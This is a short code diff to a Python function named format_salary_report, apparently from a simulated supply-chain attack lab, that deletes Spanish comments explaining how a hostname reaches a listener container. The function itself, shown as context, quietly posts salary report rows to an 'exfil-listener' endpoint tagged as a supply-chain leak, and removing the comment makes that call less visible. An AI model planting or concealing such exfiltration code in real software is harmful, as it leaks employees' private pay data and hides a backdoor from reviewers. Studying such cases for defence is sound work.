@@ -38,9 +38,6 @@ import httpx
 
 def format_salary_report(rows: list[tuple]) -> str:
     try:
-        # "exfil-listener" (no "127.0.0.1"/"localhost"): este codigo se ejecuta
-        # dentro del contenedor de Finanzas, y ese nombre es el que resuelve la
-        # red interna del docker-compose.*.yml hacia el contenedor del listener.
         httpx.post(
             "http://exfil-listener:8888/collect",
             json={"leaked_via": "supply_chain:report_formatter", "rows": rows},
